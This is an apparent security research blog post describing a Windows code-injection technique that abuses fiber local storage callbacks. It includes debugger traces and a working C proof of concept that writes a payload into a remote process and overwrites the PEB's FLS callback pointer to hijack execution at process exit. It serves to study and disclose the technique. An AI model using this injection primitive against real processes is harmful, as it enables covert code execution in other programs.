---
categories:
- windows
- code injection
comments: false
date: "2019-08-12T15:10:04Z"
title: Code Execution via Fiber Local Storage
---

While working on another research project (post to be released soon, will
update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
technique that fit my situation perfectly. Instead of tainting the other post
with its description and code, I figured I'd release a separate post describing
it here.

When I say that it's Hexacorn inspired, I mean that the bulk of the strategy is
similar to everything else you've probably seen; we open a handle to the remote
process, allocate some memory, and copy our shellcode into it. At this point we
simply need to gain control over execution flow; this is where most of
Hexacorn's techniques come in handy. PROPagate via window properties,
WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
great example is Windows Notification Facility via user subscription callbacks
(at least in modexp's proof of concept), though this one isn't Hexacorns. 

These strategies are also predicated on the process having certain capabilities
(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
not all, do not work across sessions or integrity levels. This is obvious and
expected and frankly quite niche, but in my situation, a requirement. 

## Fibers

Fibers are "a unit of execution that must be manually scheduled by the
application"[1]. They are essentially register and stack states that can be
swapped in and out at will, and reflect upon the thread in which they are
executing. A single thread can be running at most a single fiber at a time, but
fibers can be hot swapped during execution and their quantum user controlled. 

Fibers can also create and use fiber data. A pointer to this is stored in
`TEB->NtTib.FiberData` and is a per-thread structure. This is initially set
during a call to `ConvertThreadToFiber`. Taking a quick look at this:

```
void TestFiber()
{
    PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
    PVOID lpFirstFiber = NULL;
    memset(lpFiberData, 0x41, 0x10);

    lpFirstFiber = ConvertThreadToFiber(lpFiberData);
    DebugBreak();
}

int main()
{
    DWORD tid = 0;
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &tid);
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
```

We need to spawn off the test in a new thread, as the main thread will 
always have a fiber instantiated and the call will fail. If we
run this in a debugger we can inspect the data after the break:

```
0:000> ~
.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen
#  1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen
0:000> dt _NT_TIB 7ffdd000 FiberData
ucrtbased!_NT_TIB
   +0x010 FiberData : 0x002ea9c0 Void
0:000> dd poi(0x002ea9c0) l5
002ea998  41414141 41414141 41414141 41414141
002ea9a8  abababab
```

In addition to fiber data, fibers also have access to the fiber local storage 
(FLS). For all intents and purposes, this is identical to thread local storage
(TLS)[2]. This allows all thread fibers access to shared data via a global
index. The API for this is pretty simple, and very similar to TLS. In the
following sample, we'll allocate an index and toss some values in it. Using our
previous example as base:

```
lpFirstFiber = ConvertThreadToFiber(lpFiberData);
dwIdx = FlsAlloc(NULL);
FlsSetValue(dwIdx, lpFiberData);
DebugBreak();
```

A pointer to this data is stored in the thread's TEB, and can be extracted from
`TEB->FlsData`. From the above example, assume the returned FLS index for this
data is 6:

```
0:001> ~
   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
0:001> dt _TEB 7ffde000 FlsData
ntdll!_TEB
   +0xfb4 FlsData : 0x0049a008 Void
0:001> dd poi(0x0049a008+(4*8))
0049a998  41414141 41414141 41414141 41414141
0049a9a8  abababab
```

Note that the offset is always the index + 2. 

## Abusing FLS Callbacks to Obtain Execution Control

Let's return to that `FlsAlloc` call from the above example. Its first 
parameter is a `PFLS_CALLBACK_FUNCTION`[3] and is used for, according to MSDN:

```
An application-defined function. If the FLS slot is in use, FlsCallback is
called on fiber deletion, thread exit, and when an FLS index is freed. Specify
this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
type defines a pointer to this callback function. 
```

Well isn't that lovely. These callbacks are stored process wide in
`PEB->FlsCallback`. Let's try it out:

```
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
```

And fetching it (assuming again an index of 6):

```
0:001> dt _PEB 7ffd8000 FlsCallback
ucrtbased!_PEB
   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
0:001> dd 0x002d51f8 + (2 * 6 * 4) l1
002d5228  41414141
```

What happens when we let this run to process exit?

```
0:001> g
(10a8.1328): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
41414141 ??              ???
```

Recall the MSDN comment about _when_ the FLS callback is invoked: `..on fiber
deletion, thread exit, and when an FLS index is freed`. This means that worst
case our code executes once the process exits and best case following a
threads exit or call to `FlsFree`. It's worth reiterating that the primary
thread for each process will have a fiber instantiated already; it's quite
possible that this thread isn't around anymore, but this doesn't matter as the
callbacks are at the process level.

Another salient point here is the first parameter to the callback function.
This parameter is the value of whatever was in the indexed slot and is also
stashed in ECX/RCX before invoking the callback:

```
dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
FlsSetValue(dwIdx, (PVOID)0x42424242);
DebugBreak();
```

Which, when executed:

```
(aa8.169c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
41414141 ??              ???
```

Under specific circumstances, this can be quite useful. 

Anyway, PoC||GTFO, I've included some code below. In it, we overwrite the
`msvcrt!_freefls` call used to free the FLS buffer. 

```
#ifdef _WIN64
#define FlsCallbackOffset 0x320
#else
#define FlsCallbackOffset 0x20c
#endif

void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess) 
{
    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
                                                            "NtQueryInformationProcess");
    const char *payload = "\xcc\xcc\xcc\xcc";
    PROCESS_BASIC_INFORMATION pbi;
    SIZE_T sCallback = 0, sRetLen = 0;
    LPVOID lpBuf = NULL;

    //
    // allocate memory and write in our payload as one would normally do
    //

    lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);

    // now we need to fetch the remote process PEB
    NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &pbi,
                              sizeof(PROCESS_BASIC_INFORMATION), NULL);

    // read the FlsCallback address out of it
    ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
                          (LPVOID)&sCallback, sizeof(SIZE_T), &sRetLen);
    sCallback += 2 * sizeof(SIZE_T);

    // we're targeting the _freefls call, so overwrite that with our payload
    // address 
    WriteProcessMemory(hProcess, (LPVOID)sCallback, &dwNewAddr, sizeof(SIZE_T), &sRetLen);
}
```

I tested this on an updated Windows 10 x64 against notepad and mspaint; on 
process exit, the callback is executed and we gain control over execution flow.
Pretty useful in the end; more on this soon...

## References
[0] http://www.hexacorn.com   
[1] https://docs.microsoft.com/en-us/windows/win32/procthread/fibers   
[2] https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage   
[3] https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function   
